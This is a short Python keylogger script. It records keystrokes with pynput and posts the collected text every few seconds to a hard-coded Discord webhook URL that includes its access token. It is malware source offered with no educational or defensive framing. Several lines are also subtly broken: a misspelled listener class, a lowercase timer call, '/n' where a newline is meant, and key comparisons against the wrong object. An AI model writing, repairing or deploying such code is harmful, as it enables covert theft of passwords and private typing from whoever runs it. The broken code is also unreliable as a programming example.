from pynput.keyboard import Key, Listener
import requests

import threading

text = ""
webhook_url = "https://discord.com/api/webhooks/1355214135079469218/bmd6jVlDc8ibAo18U0G47e7LQvD9TWFv-TXU1zY-0yA3PMyxiyBqW7eGMATuTzAo7RKx"
time_interval = 5

def send_data():
    data = {
        "content":text,
        "title":"key Logger"
        
    }
    requests.post(webhook_url,json=data)
    timer = threading.timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text 
    if key == key.space:
        text += " "
    elif key == key.enter:
        text += "/n"
    elif key == key.shift:
        pass
    elif key == key.tab:
        text += "/t"
    elif key == key.backspace:
        if len(text) > 0 :
            text = text[:-1]
        else:
            pass
    elif key == key.esc:
        return False
    elif key == key.ctrl_l or  key == key.ctrl_r:
        pass

    
    else:
        text += str(key).strip("'")

with Key.listner(on_press=on_press) as listner:
    send_data()
    listner.join()